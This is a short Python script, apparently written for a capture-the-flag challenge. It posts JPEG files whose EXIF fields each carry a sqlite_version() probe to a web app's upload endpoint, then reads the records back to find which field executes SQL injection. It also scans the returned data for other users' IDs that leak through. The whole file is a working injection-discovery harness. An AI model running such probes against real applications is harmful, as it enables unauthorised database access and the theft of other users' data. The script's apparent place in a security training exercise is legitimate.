# upload_sweep.py — upload every f_*.jpg (each carries the sqlite_version() probe in a
# different EXIF field) and read back all fields. If ANY field shows a version like 3.40.1
# instead of the literal payload, THAT field is the SQL-injectable one.
import requests, base64, glob, json, re, os

BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"
UID  = "ea42cd39-001b-4fb5-a509-449322674687"

files = sorted(glob.glob("f_*.jpg"))
sent = {}
for f in files:
    marker = os.path.splitext(f)[0]  # f_model, etc
    uri = "data:image/jpeg;base64," + base64.b64encode(open(f,"rb").read()).decode()
    r = requests.post(f"{BASE}/upload", json={"image":uri,"description":marker,"user_id":UID})
    sent[marker] = r.status_code
    print(f"{f:22} -> {r.status_code}")

print("\n--- readback: look for a VERSION string (3.x) = injection executed ---")
data = requests.get(f"{BASE}/images/{UID}").json()
verre = re.compile(r"3\.\d+\.\d+")
for img in data:
    d = img.get("description","")
    if d in sent:
        fields = {k: img.get(k) for k in ("make","model","datetime","summary_ocr")}
        exec_hit = any(verre.search(str(v)) for v in fields.values())
        tag = "   <<<<< EXECUTED (SQLi!)" if exec_hit else ""
        print(f"{d:14} {fields}{tag}")

# also scan for any leaked foreign uuid across everything
print("\n--- foreign uuid anywhere ---")
for img in data:
    for k in ("make","model","datetime","summary_ocr"):
        for m in re.findall(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", str(img.get(k,""))):
            if m != UID:
                print(f"  LEAK {k} id={img['id']}: {m}")
